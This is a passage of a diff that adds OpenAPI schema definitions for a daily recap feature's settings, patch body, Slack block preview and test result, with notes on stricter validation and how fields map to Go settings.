+      type: object
+      description: >
+        Hand-built map in dailyRecapHandlers.getSettings. snake_case, and the
+        key names do not mirror the camelCase Settings keys one-to-one.
+      properties:
+        enabled:
+          type: boolean
+          description: settings.recapEnabled
+        send_time:
+          type: string
+          pattern: '^([01][0-9]|2[0-3]):[0-5][0-9]$'
+          description: >
+            settings.recapSendTime, `HH:MM`. PAC-24 pins the rendered form; it
+            was `HH:MM:SS` here too (U-19).
+        send_to:
+          type: string
+          enum: [dm, channel]
+          description: settings.recapSendTo
+        channel_id:
+          type: string
+          description: settings.recapChannelId
+        include_briefs:
+          type: boolean
+          description: settings.recapIncludeBriefs
+        include_focus_blocks:
+          type: boolean
+          description: settings.recapIncludeFocus (name differs)
+        include_habits:
+          type: boolean
+          description: settings.recapIncludeHabits
+      required:
+        - enabled
+        - send_time
+        - send_to
+        - channel_id
+        - include_briefs
+        - include_focus_blocks
+        - include_habits
+      additionalProperties: false
+
+    DailyRecapPatch:
+      type: object
+      description: >
+        api.recapSettingsBody. A property absent means "leave unchanged"; a
+        property present is applied.
+
+        PAC-24 makes two changes to what this document permits, both to align it
+        with PATCH /api/settings. `null` is no longer accepted anywhere: the Go
+        fields are pointers, so `null` used to be indistinguishable from an
+        omission, which meant a client that meant to clear something and a client
+        with a serialisation bug got the same silent success. And an unknown
+        property is now rejected rather than ignored, which is how a caller
+        learns it has misspelt one of these seven snake_case names.
+      properties:
+        enabled:
+          type: boolean
+        send_time:
+          type: string
+          pattern: '^([01][0-9]|2[0-3]):[0-5][0-9]$'
+          description: >
+            `HH:MM`. PAC-24 validates it; before that an unparseable value
+            reached the Postgres TIME cast during the save and surfaced as a 500
+            `db error`.
+        send_to:
+          type: string
+          enum: [dm, channel]
+          description: Anything else -> 400 (text/plain).
+        channel_id:
+          type: string
+        include_briefs:
+          type: boolean
+        include_focus_blocks:
+          type: boolean
+        include_habits:
+          type: boolean
+      additionalProperties: false
+
+    DailyRecapPreview:
+      type: object
+      description: 'Literal `{"blocks": [...]}`.'
+      properties:
+        blocks:
+          type: array
+          nullable: true
+          items:
+            $ref: '#/components/schemas/SlackBlock'
+      required: [blocks]
+      additionalProperties: false
+
+    SlackBlock:
+      type: object
+      description: >
+        engine.slackBlock is `map[string]interface{}` - an untyped Slack Block Kit
+        object. Nested values are themselves slackBlocks or arrays of them.
+
+        Resolves U-20 by reading engine/daily_recap.go end to end. Every
+        top-level block this API can emit is built by
+        DailyRecapService.BuildMessage (`:150-236`), buildSummaryBlock
+        (`:238-262`) or buildMeetingBlocks, and the complete set of top-level
+        `type` values is `header`, `context`, `section`, `divider`. The only
+        nested text object types are `plain_text` and `mrkdwn`.
+
+        `additionalProperties` stays `true`: the member set of a block varies by
+        type (`text`, `elements`, `emoji`), the Go type is a bare map, and
+        pinning the members would be a stricter claim than the code supports.
+        The `type` enum is the part that was actually determinable, and it is the
+        part a client switches on. PAC-24 changes none of this behaviour - only
+        what the contract says about it.
+      properties:
+        type:
+          type: string
+          enum: [header, context, section, divider]
+      additionalProperties: true
+
+    DailyRecapTestResult:
+      type: object
+      description: 'Literal `{"ok": true, "slack_message_ts": "..."}`.'
+      properties:
+        ok:
+          type: boolean
+          description: Always literal `true` on the 200 path.
+        slack_message_ts:
+          type: string
+          description: Slack message timestamp returned by chat.postMessage.
+      required: [ok, slack_message_ts]
+      additionalProperties: false
